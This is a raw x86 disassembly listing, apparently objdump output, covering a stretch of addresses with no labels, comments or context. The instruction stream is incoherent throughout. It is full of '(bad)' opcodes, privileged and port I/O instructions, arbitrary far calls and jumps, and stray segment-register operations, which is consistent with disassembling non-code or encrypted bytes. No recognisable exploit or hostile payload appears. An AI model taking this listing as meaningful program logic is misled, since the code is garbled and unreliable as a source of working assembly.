  4b7477:	adc    DWORD PTR [ebx+ecx*1],ecx
  4b747a:	call   0x543d:0xb9d6e006
  4b7481:	nop
  4b7482:	rol    BYTE PTR [edi],0xef
  4b7485:	pop    eax
  4b7486:	inc    BYTE PTR [eax+ebp*1+0x44c16cac]
  4b748d:	loop   0x4b7454
  4b748f:	shr    DWORD PTR [ebx+edi*1-0x3299c3b0],cl
  4b7496:	shl    ecx,0x6d
  4b7499:	popa   
  4b749a:	inc    eax
  4b749b:	mov    ds,WORD PTR [edx+eiz*4-0x4b00c22e]
  4b74a2:	(bad)  
  4b74a3:	pop    edx
  4b74a4:	add    BYTE PTR [esi+0x42],0xc
  4b74a8:	xor    ch,dh
  4b74aa:	or     dl,dh
  4b74ac:	repnz and DWORD PTR [ebx+0x321c347c],0x461e7616
  4b74b7:	sbb    esp,DWORD PTR [esi+0x7350dd86]
  4b74bd:	push   edi
  4b74be:	icebp  
  4b74bf:	push   cs
  4b74c0:	in     eax,dx
  4b74c1:	sbb    BYTE PTR [eax],ah
  4b74c3:	inc    edi
  4b74c4:	or     DWORD PTR [edx+0x1],0x18dc3072
  4b74cb:	cmc    
  4b74cc:	cmp    BYTE PTR [ebx],cl
  4b74ce:	inc    eax
  4b74cf:	in     eax,0xe9
  4b74d1:	fiadd  WORD PTR [ecx]
  4b74d3:	sub    al,0x8e
  4b74d5:	add    dl,BYTE PTR [ecx]
  4b74d7:	mov    dh,0x8
  4b74d9:	(bad)  
  4b74da:	mov    al,ds:0x60ad4174
  4b74df:	shl    edi,1
  4b74e1:	ret    0x8645
  4b74e4:	mov    ah,0x78
  4b74e6:	adc    DWORD PTR [ebx],0x1e
  4b74e9:	cs add al,0x43
  4b74ec:	xchg   ebp,eax
  4b74ed:	sbb    DWORD PTR [edi+0x45aa0a7e],ecx
  4b74f3:	enter  0xc1f7,0x53
  4b74f7:	sbb    al,al
  4b74f9:	nop
  4b74fa:	rol    BYTE PTR [ebp-0x2c5da81a],1
  4b7500:	or     cl,al
  4b7502:	adc    BYTE PTR [eax],dh
  4b7504:	fsub   QWORD PTR [bx]
  4b7507:	add    DWORD PTR [eax+0x28],edx
  4b750a:	ins    DWORD PTR es:[edi],dx
  4b750b:	shl    BYTE PTR [ebx+ecx*1],1
  4b750e:	or     BYTE PTR [edi],cl
  4b7510:	aas    
  4b7511:	lods   eax,DWORD PTR ds:[esi]
  4b7512:	inc    ebp
  4b7513:	loopne 0x4b74f7
  4b7515:	add    dh,dh
  4b7517:	sub    ecx,esp
  4b7519:	or     DWORD PTR [ecx+0x2e],0xffffffb1
  4b751d:	mov    ecx,DWORD PTR [edi+0x59]
  4b7520:	pop    ds
  4b7521:	cmp    al,0x79
  4b7523:	mov    esp,0x49e48c0f
  4b7528:	or     al,BYTE PTR [esi]
  4b752a:	or     al,0xc5
  4b752c:	(bad)  
  4b752d:	in     al,dx
  4b752e:	sbb    al,0x4a
  4b7530:	call   0xc1b6edfa
  4b7535:	pop    ebx
  4b7536:	jl     0x4b74e3
  4b7538:	stos   DWORD PTR es:[edi],eax
  4b7539:	mov    al,ds:0x3484482
  4b753e:	xchg   edx,eax
  4b753f:	push   cs
  4b7540:	mov    eax,0xc723a342
  4b7545:	or     al,0x40
  4b7547:	mov    ch,0xab
  4b7549:	pop    ss
  4b754a:	and    al,0x5a
  4b754c:	push   esp
  4b754d:	ds adc bh,cl
  4b7550:	test   al,0xc9
  4b7552:	loop   0x4b75bf
  4b7554:	add    al,BYTE PTR [esi]
  4b7556:	or     BYTE PTR [ebp-0x70],ah
  4b7559:	sbb    bh,BYTE PTR [edi-0x12]
  4b755c:	imul   edi,DWORD PTR [esi],0x63b5aaf
  4b7562:	and    edx,edx
  4b7564:	jle    0x4b74fe
  4b7566:	sub    al,0x16
  4b7568:	add    eax,0x57124bc1
  4b756d:	or     al,0x5e
  4b756f:	adc    ah,cl
  4b7571:	ins    BYTE PTR es:[edi],dx
  4b7572:	in     al,dx
  4b7573:	sbb    DWORD PTR [esp+esi*8-0x2e],edx
  4b7577:	adc    eax,0xb1241cec
  4b757c:	enter  0xe128,0xb3
  4b7580:	cmc    
  4b7581:	push   edi
  4b7582:	xlat   BYTE PTR ds:[ebx]
  4b7583:	pop    ebp
  4b7584:	out    dx,al
  4b7585:	sub    al,BYTE PTR [eax]
  4b7587:	ins    BYTE PTR es:[edi],dx
  4b7588:	rcr    edx,0xb
  4b758b:	not    BYTE PTR [edx+0x15]
  4b758e:	push   es
  4b758f:	ins    BYTE PTR es:[edi],dx
  4b7590:	mov    al,BYTE PTR [esp+esi*2-0x4db88780]
  4b7597:	inc    esi
  4b7598:	sbb    bh,BYTE PTR [edx]
  4b759a:	in     al,0xc8
  4b759c:	push   es
  4b759d:	push   es
  4b759e:	push   edi
  4b759f:	pop    ds
  4b75a0:	cmp    DWORD PTR [edx+0x23],0x2a
  4b75a4:	imul   eax,edi,0x7b
  4b75a7:	inc    edx
  4b75a8:	and    dh,BYTE PTR [eax]
  4b75aa:	jne    0x4b75f1
  4b75ac:	or     esi,DWORD PTR [esi+eax*1-0x31]
  4b75b0:	mov    al,ds:0x6ab01c13
  4b75b5:	shr    BYTE PTR [ebp+0x69],0x5e
  4b75b9:	inc    ebp
  4b75ba:	and    eax,0xc84d6998
  4b75bf:	add    BYTE PTR [edx-0x73],bl
  4b75c2:	popf   
  4b75c3:	pop    esi
  4b75c4:	call   0x785cb2e1
  4b75c9:	cmp    BYTE PTR [ebx+0x0],bh
  4b75cc:	and    DWORD PTR [esi+0x13],ecx
  4b75cf:	sub    BYTE PTR [edx+0x496b081e],0xdd
  4b75d6:	inc    eax
  4b75d7:	hlt    
  4b75d8:	jo     0x4b75c3
  4b75da:	and    ebp,DWORD PTR [eax]
  4b75dc:	ins    BYTE PTR es:[edi],dx
  4b75dd:	push   ss
  4b75de:	pop    ebx
  4b75df:	dec    ecx
  4b75e0:	dec    ebp
  4b75e1:	lea    ecx,[edi*8-0x2c8fec55]
  4b75e8:	call   0x6bf7c486
  4b75ed:	dec    ecx
  4b75ee:	dec    ebx
  4b75ef:	pop    ebx
  4b75f0:	push   edx
  4b75f1:	lahf   
  4b75f2:	cwde   
  4b75f3:	push   ebx
  4b75f4:	mov    cl,0x34
  4b75f6:	sahf   
  4b75f7:	sub    eax,0x4e518f3
  4b75fc:	outs   dx,BYTE PTR ds:[esi]
  4b75fd:	and    BYTE PTR [ecx],bl
  4b75ff:	push   edi
  4b7600:	rcl    DWORD PTR [ebx+0x4d],0xe3
  4b7604:	xchg   ecx,eax
  4b7605:	(bad)
  4b7608:	inc    ecx
  4b7609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b760a:	test   BYTE PTR [ebx],ah
  4b760c:	push   ecx
  4b760d:	out    dx,al
  4b760e:	adc    bl,dl
  4b7610:	jo     0x4b766d
  4b7612:	in     al,dx
  4b7613:	pcmpeqw mm6,QWORD PTR [ecx+0xb]
  4b7617:	aaa    
  4b7618:	push   ebx
  4b7619:	push   0xfa9d09c
  4b761e:	cmp    ch,BYTE PTR [ebp+0x758de133]
  4b7624:	mov    al,0xc0
  4b7626:	ins    DWORD PTR es:[edi],dx
  4b7627:	push   cs
  4b7628:	add    BYTE PTR [ebp+0xa],ah
  4b762b:	pop    edx
  4b762c:	dec    eax
  4b762d:	in     al,dx
  4b762e:	or     ebx,DWORD PTR [ecx+0x45]
  4b7631:	sub    eax,DWORD PTR [edx+esi*4-0x75aceb42]
  4b7638:	(bad)  
  4b7639:	clc    
  4b763a:	xor    BYTE PTR [ecx+0x3504fa2e],cl
  4b7640:	sub    DWORD PTR [ebx+0x4f],eax
  4b7643:	or     BYTE PTR [eax-0x13e9a8c],bl
  4b7649:	mov    ecx,0xde187d2b
  4b764e:	(bad)  
  4b764f:	fdiv   st,st(1)
  4b7651:	push   0x566f334d
  4b7656:	add    BYTE PTR [edi+0x5],ch
  4b7659:	or     ebp,DWORD PTR [ebp-0x5e]
  4b765c:	pop    edx
  4b765d:	pop    ebp
  4b765e:	and    BYTE PTR [ecx],al
  4b7660:	cmp    BYTE PTR [eax+0x26],0x4
  4b7664:	xchg   esp,eax
  4b7665:	xchg   BYTE PTR [ebx],dl
  4b7667:	or     ah,BYTE PTR [edi+0x42]
  4b766a:	dec    edi
  4b766b:	call   0x28d4:0xcc4c9a00
  4b7672:	lahf   
  4b7673:	and    al,0x6a
  4b7675:	pop    eax
  4b7676:	and    dl,BYTE PTR [edx]
  4b7678:	cmp    al,BYTE PTR fs:[eax+0x63]
  4b767c:	dec    esi
  4b767d:	dec    edx
  4b767e:	pop    ds
  4b767f:	and    BYTE PTR [edi],dl
  4b7681:	push   edx
  4b7682:	adc    ebp,DWORD PTR ds:0x11dbf09d
  4b7688:	or     edx,esi
  4b768a:	mov    BYTE PTR [edi+0x10],dh
  4b768d:	ror    ecx,cl
  4b768f:	add    al,0xd1
  4b7691:	out    dx,eax
  4b7692:	adc    BYTE PTR [eax],0x79
  4b7695:	data16 loopne 0x4b7673
  4b7698:	ret    
  4b7699:	jge    0x4b76a4
  4b769b:	pusha  
  4b769c:	or     DWORD PTR [ecx+0x2dd54ee6],ecx
  4b76a2:	(bad)
  4b76a5:	gs cwde 
  4b76a7:	or     al,0x1b
  4b76a9:	jg     0x4b7648
  4b76ab:	mov    ch,0x18
  4b76ad:	add    eax,0x489d5834
  4b76b2:	in     al,dx
  4b76b3:	push   eax
  4b76b4:	add    ecx,DWORD PTR [ebx]
  4b76b6:	sub    al,0x7d
  4b76b8:	nop
  4b76b9:	lea    edi,[ebx]
  4b76bb:	into   
  4b76bc:	leave  
  4b76bd:	mov    ch,0x60
  4b76bf:	js     0x4b7687
  4b76c1:	add    al,0x3e
  4b76c3:	and    DWORD PTR [ebx+0x71],ebp
  4b76c6:	xchg   edi,eax
  4b76c7:	jge    0x4b76ed
  4b76c9:	bound  esp,QWORD PTR [eax]
  4b76cb:	sbb    BYTE PTR [edx+0x85f7540],al
  4b76d1:	dec    edi
  4b76d2:	sbb    BYTE PTR [ecx-0x3f],dh
  4b76d5:	ret    0x97e9
  4b76d8:	adc    eax,0x601b3019
  4b76dd:	push   eax
  4b76de:	mov    bh,0xa0
  4b76e0:	sub    BYTE PTR [edx-0x27ab9f98],dl
  4b76e6:	pushf  
  4b76e7:	jb     0x4b7720
  4b76e9:	xor    DWORD PTR [eax+esi*1-0x2d],ecx
  4b76ed:	mov    eax,ds:0x4a02eb20
  4b76f2:	mov    cl,BYTE PTR [bx]
  4b76f5:	xchg   esi,eax
  4b76f6:	loope  0x4b772b
  4b76f8:	mov    al,0x2
  4b76fa:	sbb    BYTE PTR [esi],cl
  4b76fc:	mov    eax,ds:0x2ac6598
  4b7701:	hlt    
  4b7702:	jmp    0x4b7712
  4b7704:	push   esi
  4b7705:	aad    0x4d
  4b7707:	data16 mov ah,0xe1
  4b770a:	aaa    
  4b770b:	in     eax,dx
  4b770c:	and    al,0x83
  4b770e:	xor    edx,0xc2f0e049
  4b7714:	in     eax,0x45
  4b7716:	mov    DWORD PTR [eax],0x108a2670
  4b771c:	xor    BYTE PTR [ebx],ah
  4b771e:	loopne 0x4b76a8
  4b7720:	sub    eax,0x55c30b86
  4b7725:	and    edi,DWORD PTR ds:0x97433ba2
  4b772b:	imul   ebx,DWORD PTR [edx+0x20024c9e],0x5d8b2092
  4b7735:	inc    ebx
  4b7736:	les    eax,FWORD PTR [ebp+0x21]
  4b7739:	mov    DWORD PTR [eax-0x79],eax
  4b773c:	mov    eax,ds:0x6653a9cf
  4b7741:	test   al,0x23
  4b7743:	pop    es
  4b7744:	or     DWORD PTR [ebx+0x5262cc67],ecx
  4b774a:	inc    ecx
  4b774b:	xchg   esi,eax
  4b774c:	or     ah,BYTE PTR [ebx-0x116547f8]
  4b7752:	and    BYTE PTR [edi+0x59c156b0],bh
  4b7758:	scas   al,BYTE PTR es:[edi]
  4b7759:	ss pop edi
  4b775b:	push   eax
  4b775c:	es loopne 0x4b7747
  4b775f:	xchg   edi,eax
  4b7760:	and    BYTE PTR [ecx+0x7e8670],dh
  4b7766:	mov    eax,ds:0x2e2e701c
  4b776b:	aad    0xa2
  4b776d:	sbb    BYTE PTR [esp+edx*1],0xc2
  4b7771:	mov    DWORD PTR [eax+eiz*8+0xe],0xa1518c9
  4b7779:	sbb    ebx,DWORD PTR [edx+0x1add6842]
  4b777f:	gs sbb al,0xc0
  4b7782:	test   al,0xa9
  4b7784:	je     0x4b7759
  4b7786:	test   DWORD PTR [edi],ebp
  4b7788:	sub    eax,0x42d2501c
  4b778d:	xchg   edx,eax
  4b778e:	mov    edx,DWORD PTR [ecx+eiz*8+0x69]
  4b7792:	ret    0x8a0
  4b7795:	push   ss
  4b7796:	sahf   
  4b7797:	test   eax,0x8c2a6b0d
  4b779c:	add    al,0x40
  4b779e:	adc    dl,ah
  4b77a0:	mov    ah,0x7b
  4b77a2:	ret    0xa896
  4b77a5:	jnp    0x4b77b6
  4b77a7:	scas   eax,DWORD PTR es:[edi]
  4b77a8:	ficom  DWORD PTR [esp+ebx*1+0x21]
  4b77ac:	push   esi
  4b77ad:	add    eax,0xc0fbfa4c
  4b77b2:	shr    DWORD PTR [ecx+0x7c1e8487],1
  4b77b8:	and    BYTE PTR [ecx-0x8],al
  4b77bb:	cwde   
  4b77bc:	xchg   DWORD PTR [eax+0x21a8b527],ebp
  4b77c2:	je     0x4b77cd
  4b77c4:	or     ah,BYTE PTR [ebx+0x56183937]
  4b77ca:	push   ebx
  4b77cb:	push   edx
  4b77cc:	mov    ecx,0x94f4beda
  4b77d1:	div    BYTE PTR [edx-0x37c0d98e]
  4b77d7:	call   0xb36:0x88ff71af
  4b77de:	sub    ecx,edx
  4b77e0:	mov    dl,BYTE PTR [ebp+0x18]
  4b77e3:	clc    
  4b77e4:	push   0xbc12c50b
  4b77e9:	fs call 0x6280:0xaaf3214b
  4b77f1:	jae    0x4b7846
  4b77f3:	mov    ebp,0x174a06ed
  4b77f8:	inc    ebp
  4b77f9:	clc    
  4b77fa:	fdivr  DWORD PTR [esi+0x11]
  4b77fd:	jl     0x4b7840
  4b77ff:	rcl    BYTE PTR [ebp+0x1b13b532],cl
  4b7805:	and    edx,DWORD PTR [edx]
  4b7807:	add    al,0xa3
  4b7809:	cwde   
  4b780a:	xor    BYTE PTR [esi+0x2c],ah
  4b780d:	in     eax,0x2f
  4b780f:	scas   eax,DWORD PTR es:[edi]
  4b7810:	dec    ecx
  4b7811:	imul   esp,DWORD PTR [eax+esi*4-0x53adf323],0x2c205ca0
  4b781c:	push   ecx
  4b781d:	inc    ecx
  4b781e:	sbb    al,0xe
  4b7820:	push   cs
  4b7821:	sbb    cl,BYTE PTR [eax+eiz*8]
  4b7824:	sub    bl,BYTE PTR [esi]
  4b7826:	or     eax,DWORD PTR [edx-0x73cc8ae]
  4b782c:	xchg   edi,eax
  4b782d:	imul   eax,DWORD PTR [edi],0x7593f8b
  4b7833:	gs mov esp,0x8a325be
  4b7839:	sbb    al,0xae
  4b783b:	add    eax,0x4ae8fb4
  4b7840:	je     0x4b787a
  4b7842:	or     BYTE PTR [eax],cl
  4b7844:	imul   edi,esi,0x0
  4b7847:	push   0x240a7cf0
  4b784c:	call   FWORD PTR [edi]
  4b784e:	fld    QWORD PTR [edi]
  4b7850:	sub    BYTE PTR [ebx-0x7b],ch
  4b7853:	and    BYTE PTR [ecx-0x37],dl
  4b7856:	add    ebx,DWORD PTR [ebx-0x25]
  4b7859:	push   edi
  4b785a:	xchg   DWORD PTR [ebp-0x27],ebx
  4b785d:	pop    ds
  4b785e:	(bad)  [ecx]
  4b7860:	xor    ch,BYTE PTR [esi]
  4b7862:	inc    edx
  4b7863:	jp     0x4b78ae
  4b7865:	xchg   esi,ebp
  4b7867:	mov    ebp,0x1d2583d1
  4b786c:	lea    ebp,[eax]
  4b786e:	mov    BYTE PTR [esi-0x7b],al
  4b7871:	push   cs
  4b7872:	cmp    al,0x12
  4b7874:	lods   eax,DWORD PTR ds:[esi]
  4b7875:	sub    eax,DWORD PTR [ecx-0x53]
  4b7878:	fisub  DWORD PTR [esp+edx*2]
  4b787b:	mov    dl,0x5d
  4b787d:	mov    dh,0xa2
  4b787f:	nop
  4b7880:	sbb    al,0x81
  4b7882:	jmp    0x9786:0x5d3c0171
  4b7889:	bound  esi,QWORD PTR [edi]
  4b788b:	call   0x1c85:0x729aa50f
  4b7892:	push   ebx
  4b7893:	inc    edx
  4b7894:	popf   
  4b7895:	mov    bh,0xbf
  4b7897:	ret    
  4b7898:	ins    BYTE PTR es:[edi],dx
  4b7899:	ret    
  4b789a:	inc    ecx
  4b789b:	push   cs
  4b789c:	fwait
  4b789d:	pushf  
  4b789e:	fwait
  4b789f:	and    BYTE PTR [edx],dl
  4b78a1:	or     DWORD PTR [ecx-0x24cc57f3],eax
  4b78a7:	pop    ebp
  4b78a8:	(bad)  
  4b78a9:	inc    eax
  4b78aa:	xor    BYTE PTR [edx+0x55],al
  4b78ad:	int    0x7
  4b78af:	inc    ecx
  4b78b0:	mov    al,ds:0x451b9979
  4b78b5:	jmp    0x4b7843
  4b78b7:	es test eax,0x6689b15b
  4b78bd:	pop    ds
  4b78be:	and    eax,ecx
  4b78c0:	xor    eax,DWORD PTR [ebx]
  4b78c2:	fsub   QWORD PTR [ebp+0x1e]
  4b78c5:	mov    DWORD PTR [esi+0x61],edi
  4b78c8:	xor    DWORD PTR [edx+0x4c],edx
  4b78cb:	fwait
  4b78cc:	push   edx
  4b78cd:	cld    
  4b78ce:	xchg   BYTE PTR [ebp+0x5b],cl
  4b78d1:	fidiv  DWORD PTR [esi+0x6874a5e]
  4b78d7:	sbb    cl,BYTE PTR [eax-0xdf866f2]
  4b78dd:	dec    esp
  4b78de:	sbb    dl,BYTE PTR [edi]
  4b78e0:	ret    0xf91e
  4b78e3:	rcr    bl,1
  4b78e5:	add    BYTE PTR [edx-0x43],dl
  4b78e8:	xchg   ebp,eax
  4b78e9:	or     dh,ch
  4b78eb:	in     eax,dx
  4b78ec:	rcr    BYTE PTR [edi+0x59d8743b],cl
  4b78f2:	adc    eax,0x2cf3c3f
  4b78f7:	(bad)  
  4b78f8:	adc    DWORD PTR [edx+0x243fa550],ebp
  4b78fe:	jmp    0x1c9e8313
  4b7903:	mov    al,ds:0x1d68c296
  4b7908:	rcr    BYTE PTR [edi+0x28],cl
  4b790b:	adc    DWORD PTR [esi+ebx*4+0x5fa4572b],ecx
  4b7912:	ret    0x947a
  4b7915:	inc    edi
  4b7916:	shl    DWORD PTR [eax],0x4a
  4b7919:	sbb    BYTE PTR [edx+0x49],0x30
  4b791d:	mov    eax,edi
  4b791f:	push   eax
  4b7920:	mov    ds:0x30e74c86,al
  4b7925:	push   edi
  4b7926:	icebp  
  4b7927:	or     BYTE PTR [eax+0x13],ch
  4b792a:	inc    esp
  4b792b:	sahf   
  4b792c:	sbb    DWORD PTR [edi],0xfffffff4
  4b792f:	dec    ebp
  4b7930:	test   eax,0x4eeb02ef
  4b7935:	push   esi
  4b7936:	jmp    0x4b7996
  4b7938:	ret    
  4b7939:	ret    
  4b793a:	adc    eax,0x6cc6cc0a
  4b793f:	push   ebx
  4b7940:	int    0x22
  4b7942:	push   0x85b2e750
  4b7947:	xor    BYTE PTR ds:0x1d6d2c33,bl
  4b794d:	hlt    
  4b794e:	or     BYTE PTR [ecx-0x7fb07bb0],cl
  4b7954:	mov    bl,0x1
  4b7956:	xchg   edi,eax
  4b7957:	adc    al,0xf
  4b7959:	test   BYTE PTR [esi-0x38],dl
  4b795c:	sar    BYTE PTR ds:0x26b55dc2,1
  4b7962:	aad    0x42
  4b7964:	xor    DWORD PTR ds:0xc14e0ab0,esi
  4b796a:	xchg   ebx,eax
  4b796b:	sub    ah,BYTE PTR [edx+eax*2+0x75a73d40]
  4b7972:	xchg   ebp,eax
  4b7973:	xor    al,0x7f
  4b7975:	ret    
  4b7976:	int    0x78
  4b7978:	fs cmp eax,0xfed59960
  4b797e:	adc    dl,0x41
  4b7981:	add    ebx,DWORD PTR [edi+eiz*1+0x41cfbc21]
  4b7988:	sub    eax,0xc125fad4
  4b798d:	or     ah,bl
  4b798f:	sbb    esi,DWORD PTR [ebx]
  4b7991:	xchg   ebp,eax
  4b7992:	pop    ebp
  4b7993:	and    dh,BYTE PTR [esi-0x6a]
  4b7996:	adc    eax,0x8ed6e598
  4b799b:	ins    BYTE PTR es:[edi],dx
  4b799c:	sub    DWORD PTR [eax],edx
  4b799e:	xchg   ebx,eax
  4b799f:	in     al,dx
  4b79a0:	jbe    0x4b7a1a
  4b79a2:	mov    esi,0x413dbc91
  4b79a7:	mov    dl,0x24
  4b79a9:	xchg   esi,eax
  4b79aa:	sbb    BYTE PTR [ebp+0x6d80a00c],dl
  4b79b0:	jns    0x4b799e
  4b79b2:	xchg   ebx,eax
  4b79b3:	pop    eax
  4b79b4:	pop    ss
  4b79b5:	pop    ebx
  4b79b6:	sub    DWORD PTR [ecx-0x763d3d9],edi
  4b79bc:	and    eax,0x544a7c97
  4b79c1:	das    
  4b79c2:	jb     0x4b797f
  4b79c4:	pop    es
  4b79c5:	xchg   ebx,eax
  4b79c6:	(bad)  [ebx]
  4b79c8:	fsub   QWORD PTR [edi]
  4b79ca:	push   es
  4b79cb:	sub    eax,DWORD PTR [edi+0x2659a943]
  4b79d1:	paddusw mm0,QWORD PTR [ebp-0x1f]
  4b79d5:	add    ebp,DWORD PTR [edi-0x495bce9f]
  4b79db:	adc    ebx,DWORD PTR ds:0xefbc53a4
  4b79e1:	pop    ebx
  4b79e2:	loopne 0x4b798f
  4b79e4:	jo     0x4b7a55
  4b79e6:	xchg   edi,eax
  4b79e7:	pop    esp
  4b79e8:	mov    bl,al
  4b79ea:	test   DWORD PTR [edx+0x7125d627],0x5e802603
  4b79f4:	call   0xe7a8287
  4b79f9:	mov    edi,0x45dd3dbc
  4b79fe:	std    
  4b79ff:	jmp    0x4b7a12
  4b7a01:	and    al,0x2
  4b7a03:	je     0x4b7a1b
  4b7a05:	mov    ecx,0xfff98561
  4b7a0a:	add    BYTE PTR [esi-0x3952bb6],al
  4b7a10:	lods   eax,DWORD PTR ds:[esi]
  4b7a11:	adc    al,dl
  4b7a13:	sub    al,0x40
  4b7a15:	xchg   DWORD PTR [edx],ebx
  4b7a17:	or     edx,DWORD PTR [esi+0x23f4b0df]
  4b7a1d:	mov    edx,0x21ebfb6a
  4b7a22:	xchg   esp,eax
  4b7a23:	ror    BYTE PTR es:[ebx+0xc],0x48
  4b7a28:	cvtps2pi mm0,xmm0
  4b7a2b:	outs   dx,BYTE PTR es:[esi]
  4b7a2d:	adc    esp,ecx
  4b7a2f:	cli    
  4b7a30:	jne    0x4b7a0d
  4b7a32:	mov    eax,0xaa10d801
  4b7a37:	jmp    0xcab85097
  4b7a3c:	pop    ecx
  4b7a3d:	lods   eax,DWORD PTR ds:[esi]
  4b7a3e:	std    
  4b7a3f:	test   DWORD PTR [ebp+0x676d1615],eax
  4b7a45:	retf   0x8742
  4b7a48:	adc    cl,ch
  4b7a4a:	mov    es,eax
  4b7a4c:	add    DWORD PTR [ebx-0x16],ecx
  4b7a4f:	mov    ah,0x5
  4b7a51:	enter  0x520a,0x1a
  4b7a55:	cmp    cl,BYTE PTR [ebx+0x649ddca6]
  4b7a5b:	scas   al,BYTE PTR es:[edi]
  4b7a5c:	in     al,dx
  4b7a5d:	scas   al,BYTE PTR es:[edi]
  4b7a5e:	lds    eax,FWORD PTR [eax]
  4b7a60:	test   DWORD PTR [edx+0x616aa78d],eax
  4b7a66:	jmp    0x11451bc9
  4b7a6b:	jl     0x4b7a75
  4b7a6d:	mov    edi,0xf81702
  4b7a72:	daa    
  4b7a73:	sub    eax,0xb8c1c865
  4b7a78:	push   es
  4b7a79:	sbb    bl,BYTE PTR [edx-0x6]
  4b7a7c:	mov    ebx,0xbccc8107
  4b7a81:	inc    ebx
  4b7a82:	mov    al,0xc6
  4b7a84:	enter  0x582a,0x8d
  4b7a88:	xchg   esi,eax
  4b7a89:	rol    BYTE PTR [ebp-0x70],1
  4b7a8c:	pusha  
  4b7a8d:	imul   ebp,DWORD PTR [ecx-0x57],0x8f0c11e1
  4b7a94:	pop    ecx
  4b7a95:	fwait
  4b7a96:	adc    BYTE PTR [eax],dh
  4b7a98:	pop    ebx
  4b7a99:	clc    
  4b7a9a:	dec    ebp
  4b7a9b:	and    edx,DWORD PTR [ebx-0x57]
  4b7a9e:	cmp    ebx,eax
  4b7aa0:	pop    ebx
  4b7aa1:	div    BYTE PTR [esp+edx*1-0x9]
  4b7aa5:	outs   dx,BYTE PTR ds:[esi]
  4b7aa6:	loopne 0x4b7ace
  4b7aa8:	dec    ebx
  4b7aa9:	jo     0x4b7af0
  4b7aab:	lds    ebp,FWORD PTR [edx+0x44]
  4b7aae:	cmp    edx,DWORD PTR [esi]
  4b7ab0:	pusha  
  4b7ab1:	add    DWORD PTR [ebx+eax*2-0x1eb261c5],ebx
  4b7ab8:	div    DWORD PTR [edx-0xc953c07]
  4b7abe:	jmp    0x4b7aed
  4b7ac0:	push   ebx
  4b7ac1:	and    ah,BYTE PTR [ebp-0x5b]
  4b7ac4:	div    DWORD PTR [ebx+0x14]
  4b7ac7:	and    ch,bl
  4b7ac9:	repnz xchg ebp,eax
  4b7acb:	out    dx,eax
  4b7acc:	outs   dx,BYTE PTR ds:[esi]
  4b7acd:	pop    eax
  4b7ace:	sbb    DWORD PTR [edi-0x1409eef0],edi
  4b7ad4:	adc    BYTE PTR [edi+0x7ebf220],bh
  4b7ada:	mov    edi,0xe1245040
  4b7adf:	scas   eax,DWORD PTR es:[edi]
  4b7ae0:	cmc    
  4b7ae1:	push   edi
  4b7ae2:	adc    al,BYTE PTR [ebp+0xc5e067e]
  4b7ae8:	dec    ecx
  4b7ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b7aea:	popa   
  4b7aeb:	or     al,0xb4
  4b7aed:	jmp    0x4b7a70
  4b7aef:	je     0x4b7b5a
  4b7af1:	popa   
  4b7af2:	adc    al,0x33
  4b7af4:	loop   0x4b7b04
  4b7af6:	inc    eax
  4b7af7:	sbb    BYTE PTR [ebp-0x68],0xf4
  4b7afb:	push   ds
  4b7afc:	inc    ebp
  4b7afd:	dec    edi
  4b7afe:	or     edx,edi
  4b7b00:	(bad)  
  4b7b01:	fwait
  4b7b02:	hlt    
  4b7b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b7b04:	mov    cl,0x34
  4b7b06:	lods   eax,DWORD PTR ds:[esi]
  4b7b07:	shl    DWORD PTR [esi+edx*1+0xc],cl
  4b7b0b:	add    al,0xf4
  4b7b0d:	or     edi,edi
  4b7b0f:	fild   DWORD PTR [ebx]
  4b7b11:	xor    BYTE PTR [eax],dh
  4b7b13:	clc    
  4b7b14:	cwde   
  4b7b15:	xchg   BYTE PTR [ebx],cl
  4b7b17:	(bad)  [eax]
  4b7b19:	(bad)  
  4b7b1a:	pop    di
  4b7b1c:	(bad)  
  4b7b1d:	dec    esi
  4b7b1e:	jl     0x4b7b5f
  4b7b20:	push   ecx
  4b7b21:	aaa    
  4b7b22:	add    edx,DWORD PTR [ecx+0x71b00c87]
  4b7b28:	add    eax,0x680d6c56
  4b7b2d:	enter  0x52b1,0x37
  4b7b31:	add    ch,cl
  4b7b33:	add    al,0x0
  4b7b35:	dec    edi
  4b7b36:	outs   dx,BYTE PTR ds:[esi]
  4b7b37:	and    ebx,DWORD PTR [esi+0x4e]
  4b7b3a:	adc    ecx,DWORD PTR [eax+0x220e382a]
  4b7b40:	and    eax,0x124297cf
  4b7b45:	jno    0x4b7b57
  4b7b47:	add    al,0x52
  4b7b49:	push   es
  4b7b4a:	jecxz  0x4b7b1a
  4b7b4c:	jnp    0x4b7b8c
  4b7b4e:	push   es
  4b7b4f:	push   eax
  4b7b50:	push   cs
  4b7b51:	xor    al,0x3
  4b7b53:	pop    esi
  4b7b54:	push   0x1b
  4b7b56:	cmp    al,0x78
  4b7b58:	pop    eax
  4b7b59:	outs   dx,DWORD PTR ds:[esi]
  4b7b5a:	jbe    0x4b7b11
  4b7b5c:	jne    0x4b7b64
  4b7b5e:	and    al,0x6
  4b7b60:	sub    al,0x38
  4b7b62:	int3   
  4b7b63:	adc    al,0xe8
  4b7b65:	push   ss
  4b7b66:	or     ch,BYTE PTR [eax-0x6497a6ce]
  4b7b6c:	xchg   DWORD PTR [edx+0x51],edi
  4b7b6f:	cmp    edi,DWORD PTR [edx+0x552890b0]
  4b7b75:	sub    edx,DWORD PTR [esi-0x1cccbd3d]
  4b7b7b:	adc    cl,BYTE PTR [eax-0x6f11edf3]
  4b7b81:	add    al,0x94
  4b7b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b7b84:	inc    ebx
  4b7b85:	repnz lods al,BYTE PTR ds:[esi]
  4b7b87:	mov    dh,0x4
  4b7b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b7b8a:	mov    edx,0x11e169b
  4b7b8f:	and    DWORD PTR [ebp+0x5c],eax
  4b7b92:	es sbb al,0x2
  4b7b95:	sub    cl,BYTE PTR [edi+ebp*4+0x69]
  4b7b99:	add    eax,0xd3cf3c8c
  4b7b9e:	jbe    0x4b7c02
  4b7ba0:	push   esp
  4b7ba1:	mov    eax,DWORD PTR [esi]
  4b7ba3:	pusha  
  4b7ba4:	ins    BYTE PTR es:[edi],dx
  4b7ba5:	jmp    0xfcf3:0xaa3859f3
  4b7bac:	push   ebx
  4b7bad:	or     BYTE PTR [esi+eiz*1-0x7c],dh
  4b7bb1:	psubw  mm6,mm2
  4b7bb4:	popf   
  4b7bb5:	xchg   esp,eax
  4b7bb6:	add    al,0xb6
